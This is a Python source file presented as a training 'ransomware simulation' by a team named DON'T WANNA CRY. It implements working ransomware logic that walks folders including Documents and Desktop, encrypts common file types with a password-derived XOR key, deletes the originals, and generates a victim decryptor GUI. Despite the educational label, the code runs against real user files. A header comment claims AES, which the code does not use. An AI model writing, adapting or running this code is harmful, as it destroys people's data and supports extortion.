# -*- coding: utf-8 -*-
"""
Advanced Ransomware Simulation - Crypto Engine
Team: DON'T WANNA CRY
Purpose: Real AES encryption for security training

WARNING: Educational purposes only!
"""

import os
import sys
import base64
import hashlib
import secrets
import json
from pathlib import Path
from datetime import datetime

# Use built-in libraries for encryption (no external dependencies)
# We'll use a simple but effective XOR-based cipher with key derivation
# For production, use cryptography library with AES

class CryptoEngine:
    """
    Encryption engine using password-derived key encryption.
    Uses PBKDF2 for key derivation and XOR cipher with salt.
    """
    
    MAGIC_HEADER = b"DWCRYPT01"  # File signature
    SALT_SIZE = 32
    KEY_SIZE = 32
    ITERATIONS = 100000
    
    # Safe directories to target (never touch system files)
    SAFE_TARGETS = [
        "target_data",
        "RansomTest", 
        "Documents",
        "Desktop"
    ]
    
    # Extensions to encrypt
    TARGET_EXTENSIONS = [
        '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
        '.pdf', '.jpg', '.jpeg', '.png', '.gif', '.csv', '.json',
        '.xml', '.sql', '.db', '.zip', '.rar'
    ]
    
    # Files/folders to NEVER touch
    BLACKLIST = [
        'Windows', 'Program Files', 'Program Files (x86)',
        'AppData', 'ProgramData', '$Recycle.Bin', 'System32',
        '.dll', '.exe', '.sys', '.ini', '.bat', '.cmd',
        'ntuser', 'bootmgr', 'pagefile', 'hiberfil',
        'DECRYPT', 'README', 'RESTORE'
    ]
    
    ENCRYPTED_EXT = ".dwcrypt"
    
    def __init__(self, password: str):
        """Initialize with encryption password."""
        self.password = password
        self.encrypted_files = []
        self.encryption_key = None
        self.salt = None
    
    def _derive_key(self, password: str, salt: bytes) -> bytes:
        """Derive encryption key from password using PBKDF2."""
        key = hashlib.pbkdf2_hmac(
            'sha256',
            password.encode('utf-8'),
            salt,
            self.ITERATIONS,
            dklen=self.KEY_SIZE
        )
        return key
    
    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """XOR-based encryption with key expansion."""
        # Expand key to match data length
        key_expanded = (key * ((len(data) // len(key)) + 1))[:len(data)]
        # XOR operation
        encrypted = bytes(a ^ b for a, b in zip(data, key_expanded))
        return encrypted
    
    def _xor_decrypt(self, data: bytes, key: bytes) -> bytes:
        """XOR decryption (same as encryption for XOR)."""
        return self._xor_encrypt(data, key)
    
    def encrypt_file(self, filepath: str) -> bool:
        """
        Encrypt a single file with password-derived key.
        Returns True if successful.
        """
        try:
            filepath = Path(filepath)
            
            # Safety checks
            if not filepath.exists():
                return False
            
            if filepath.suffix == self.ENCRYPTED_EXT:
                return False  # Already encrypted
            
            # Check blacklist
            path_str = str(filepath).lower()
            for blacklisted in self.BLACKLIST:
                if blacklisted.lower() in path_str:
                    return False
            
            # Read original file
            with open(filepath, 'rb') as f:
                original_data = f.read()
            
            # Generate salt for this file
            salt = secrets.token_bytes(self.SALT_SIZE)
            
            # Derive key
            key = self._derive_key(self.password, salt)
            
            # Encrypt data
            encrypted_data = self._xor_encrypt(original_data, key)
            
            # Create encrypted file structure
            # [MAGIC_HEADER][SALT][ENCRYPTED_DATA]
            encrypted_content = self.MAGIC_HEADER + salt + encrypted_data
            
            # Store original filename in metadata
            metadata = {
                "original_name": filepath.name,
                "original_size": len(original_data),
                "encrypted_at": datetime.now().isoformat(),
                "team": "DONT WANNA CRY"
            }
            metadata_json = json.dumps(metadata).encode('utf-8')
            metadata_len = len(metadata_json).to_bytes(4, 'big')
            
            # Final structure: [MAGIC][SALT][META_LEN][META][ENCRYPTED_DATA]
            final_content = (
                self.MAGIC_HEADER + 
                salt + 
                metadata_len + 
                metadata_json + 
                encrypted_data
            )
            
            # Write encrypted file
            encrypted_path = str(filepath) + self.ENCRYPTED_EXT
            with open(encrypted_path, 'wb') as f:
                f.write(final_content)
            
            # Remove original file
            os.remove(filepath)
            
            self.encrypted_files.append({
                "original": str(filepath),
                "encrypted": encrypted_path,
                "size": len(original_data)
            })
            
            return True
            
        except Exception as e:
            print(f"Encryption error: {e}")
            return False
    
    def decrypt_file(self, encrypted_path: str, password: str) -> tuple:
        """
        Decrypt a file with password.
        Returns (success: bool, original_data: bytes or error_message: str)
        """
        try:
            encrypted_path = Path(encrypted_path)
            
            if not encrypted_path.exists():
                return False, "File not found"
            
            with open(encrypted_path, 'rb') as f:
                content = f.read()
            
            # Verify magic header
            if not content.startswith(self.MAGIC_HEADER):
                return False, "Invalid encrypted file format"
            
            # Parse structure
            offset = len(self.MAGIC_HEADER)
            salt = content[offset:offset + self.SALT_SIZE]
            offset += self.SALT_SIZE
            
            metadata_len = int.from_bytes(content[offset:offset + 4], 'big')
            offset += 4
            
            metadata_json = content[offset:offset + metadata_len]
            offset += metadata_len
            
            encrypted_data = content[offset:]
            
            # Parse metadata
            try:
                metadata = json.loads(metadata_json.decode('utf-8'))
            except:
                metadata = {"original_name": "unknown"}
            
            # Derive key with provided password
            key = self._derive_key(password, salt)
            
            # Decrypt
            decrypted_data = self._xor_decrypt(encrypted_data, key)
            
            # Verify decryption (check if data looks valid)
            # For text files, check if mostly printable
            try:
                # Try to decode as text
                decrypted_data.decode('utf-8')
                is_valid = True
            except:
                # Check if binary data looks reasonable
                is_valid = len(decrypted_data) == metadata.get("original_size", len(decrypted_data))
            
            return True, decrypted_data, metadata
            
        except Exception as e:
            return False, f"Decryption error: {e}", {}
    
    def restore_file(self, encrypted_path: str, password: str) -> bool:
        """
        Decrypt and restore file to original location.
        Returns True if successful.
        """
        try:
            result = self.decrypt_file(encrypted_path, password)
            
            if not result[0]:
                return False
            
            success, decrypted_data, metadata = result
            
            # Determine original path
            encrypted_path = Path(encrypted_path)
            original_name = metadata.get("original_name", encrypted_path.stem)
            original_path = encrypted_path.parent / original_name
            
            # Write decrypted file
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            # Remove encrypted file
            os.remove(encrypted_path)
            
            return True
            
        except Exception as e:
            print(f"Restore error: {e}")
            return False
    
    def encrypt_directory(self, directory: str, callback=None) -> dict:
        """
        Encrypt all target files in a directory.
        Returns stats dictionary.
        """
        stats = {
            "scanned": 0,
            "encrypted": 0,
            "skipped": 0,
            "failed": 0,
            "files": []
        }
        
        directory = Path(directory)
        if not directory.exists():
            return stats
        
        for root, dirs, files in os.walk(directory):
            # Skip blacklisted directories
            dirs[:] = [d for d in dirs if not any(
                bl.lower() in d.lower() for bl in self.BLACKLIST
            )]
            
            for filename in files:
                stats["scanned"] += 1
                filepath = Path(root) / filename
                
                # Check extension
                if filepath.suffix.lower() not in self.TARGET_EXTENSIONS:
                    stats["skipped"] += 1
                    continue
                
                # Check if already encrypted
                if filepath.suffix == self.ENCRYPTED_EXT:
                    stats["skipped"] += 1
                    continue
                
                # Encrypt
                if self.encrypt_file(str(filepath)):
                    stats["encrypted"] += 1
                    stats["files"].append(str(filepath))
                    if callback:
                        callback(f"ENCRYPTED: {filename}")
                else:
                    stats["failed"] += 1
        
        return stats


def create_decryptor_stub(password: str, output_dir: str) -> str:
    """
    Create a standalone decryptor script that victims can use.
    Returns path to decryptor.
    """
    decryptor_code = '''# -*- coding: utf-8 -*-
"""
File Decryptor - Team DONT WANNA CRY
Enter the correct password to decrypt your files.
"""

import os
import sys
import hashlib
import json
import tkinter as tk
from tkinter import messagebox, filedialog, scrolledtext
from pathlib import Path

MAGIC_HEADER = b"DWCRYPT01"
SALT_SIZE = 32
KEY_SIZE = 32
ITERATIONS = 100000

class DecryptorGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("File Decryptor - DONT WANNA CRY")
        self.root.geometry("600x500")
        self.root.configure(bg="#1a1a2e")
        self.root.resizable(False, False)
        
        self._create_ui()
        self.root.mainloop()
    
    def _create_ui(self):
        # Header
        tk.Label(
            self.root,
            text="FILE DECRYPTOR",
            font=("Consolas", 24, "bold"),
            fg="#e74c3c",
            bg="#1a1a2e"
        ).pack(pady=20)
        
        tk.Label(
            self.root,
            text="Team: DONT WANNA CRY",
            font=("Consolas", 14),
            fg="#f39c12",
            bg="#1a1a2e"
        ).pack()
        
        # File selection
        file_frame = tk.Frame(self.root, bg="#1a1a2e")
        file_frame.pack(pady=20, padx=30, fill="x")
        
        tk.Label(
            file_frame,
            text="Encrypted File:",
            font=("Arial", 12),
            fg="white",
            bg="#1a1a2e"
        ).pack(anchor="w")
        
        self.file_entry = tk.Entry(file_frame, font=("Consolas", 11), width=50)
        self.file_entry.pack(side="left", fill="x", expand=True)
        
        tk.Button(
            file_frame,
            text="Browse",
            command=self._browse_file,
            bg="#27ae60",
            fg="white",
            font=("Arial", 10)
        ).pack(side="right", padx=5)
        
        # Password
        pass_frame = tk.Frame(self.root, bg="#1a1a2e")
        pass_frame.pack(pady=10, padx=30, fill="x")
        
        tk.Label(
            pass_frame,
            text="Decryption Password:",
            font=("Arial", 12),
            fg="white",
            bg="#1a1a2e"
        ).pack(anchor="w")
        
        self.pass_entry = tk.Entry(pass_frame, font=("Consolas", 11), show="*", width=50)
        self.pass_entry.pack(fill="x")
        
        # Buttons
        btn_frame = tk.Frame(self.root, bg="#1a1a2e")
        btn_frame.pack(pady=20)
        
        tk.Button(
            btn_frame,
            text="DECRYPT FILE",
            command=self._decrypt,
            bg="#e74c3c",
            fg="white",
            font=("Consolas", 14, "bold"),
            padx=30,
            pady=10
        ).pack(side="left", padx=10)
        
        tk.Button(
            btn_frame,
            text="DECRYPT ALL",
            command=self._decrypt_all,
            bg="#3498db",
            fg="white",
            font=("Consolas", 14, "bold"),
            padx=30,
            pady=10
        ).pack(side="left", padx=10)
        
        # Log
        tk.Label(
            self.root,
            text="Decryption Log:",
            font=("Arial", 12),
            fg="white",
            bg="#1a1a2e"
        ).pack(anchor="w", padx=30)
        
        self.log = scrolledtext.ScrolledText(
            self.root,
            bg="#0d0d0d",
            fg="#00ff41",
            font=("Consolas", 10),
            height=10
        )
        self.log.pack(fill="both", expand=True, padx=30, pady=10)
    
    def _browse_file(self):
        filepath = filedialog.askopenfilename(
            filetypes=[("Encrypted files", "*.dwcrypt"), ("All files", "*.*")]
        )
        if filepath:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, filepath)
    
    def _log(self, msg):
        self.log.insert(tk.END, f"{msg}\\n")
        self.log.see(tk.END)
    
    def _derive_key(self, password, salt):
        return hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, ITERATIONS, dklen=KEY_SIZE)
    
    def _xor_decrypt(self, data, key):
        key_expanded = (key * ((len(data) // len(key)) + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_expanded))
    
    def _decrypt_file(self, filepath, password):
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            
            if not content.startswith(MAGIC_HEADER):
                return False, "Invalid file format"
            
            offset = len(MAGIC_HEADER)
            salt = content[offset:offset + SALT_SIZE]
            offset += SALT_SIZE
            
            metadata_len = int.from_bytes(content[offset:offset + 4], 'big')
            offset += 4
            
            metadata_json = content[offset:offset + metadata_len]
            offset += metadata_len
            
            encrypted_data = content[offset:]
            
            metadata = json.loads(metadata_json.decode('utf-8'))
            key = self._derive_key(password, salt)
            decrypted_data = self._xor_decrypt(encrypted_data, key)
            
            # Restore file
            original_name = metadata.get("original_name", Path(filepath).stem)
            original_path = Path(filepath).parent / original_name
            
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            os.remove(filepath)
            return True, original_name
            
        except Exception as e:
            return False, str(e)
    
    def _decrypt(self):
        filepath = self.file_entry.get().strip()
        password = self.pass_entry.get()
        
        if not filepath:
            messagebox.showerror("Error", "Please select a file")
            return
        
        if not password:
            messagebox.showerror("Error", "Please enter password")
            return
        
        self._log(f"Decrypting: {filepath}")
        success, result = self._decrypt_file(filepath, password)
        
        if success:
            self._log(f"SUCCESS: Restored {result}")
            messagebox.showinfo("Success", f"File decrypted: {result}")
        else:
            self._log(f"FAILED: {result}")
            messagebox.showerror("Failed", f"Decryption failed: {result}")
    
    def _decrypt_all(self):
        password = self.pass_entry.get()
        if not password:
            messagebox.showerror("Error", "Please enter password")
            return
        
        folder = filedialog.askdirectory(title="Select folder with encrypted files")
        if not folder:
            return
        
        count = 0
        for root, dirs, files in os.walk(folder):
            for filename in files:
                if filename.endswith(".dwcrypt"):
                    filepath = os.path.join(root, filename)
                    self._log(f"Decrypting: {filename}")
                    success, result = self._decrypt_file(filepath, password)
                    if success:
                        self._log(f"SUCCESS: {result}")
                        count += 1
                    else:
                        self._log(f"FAILED: {result}")
        
        messagebox.showinfo("Complete", f"Decrypted {count} files")

if __name__ == "__main__":
    DecryptorGUI()
'''
    
    decryptor_path = Path(output_dir) / "DECRYPT_FILES.py"
    with open(decryptor_path, 'w', encoding='utf-8') as f:
        f.write(decryptor_code)
    
    return str(decryptor_path)


# Test
if __name__ == "__main__":
    print("Crypto Engine Test")
    print("=" * 50)
    
    # Create test directory
    test_dir = Path("test_encryption")
    test_dir.mkdir(exist_ok=True)
    
    # Create test files
    for i in range(3):
        test_file = test_dir / f"test_document_{i}.txt"
        with open(test_file, 'w') as f:
            f.write(f"This is test document {i}\nConfidential content here.\n" * 10)
        print(f"Created: {test_file}")
    
    # Encrypt
    password = "SecretPassword123"
    engine = CryptoEngine(password)
    
    print(f"\nEncrypting with password: {password}")
    stats = engine.encrypt_directory(str(test_dir))
    print(f"Encrypted: {stats['encrypted']} files")
    
    # Create decryptor
    decryptor_path = create_decryptor_stub(password, str(test_dir))
    print(f"Decryptor created: {decryptor_path}")
    
    print("\nTest complete!")
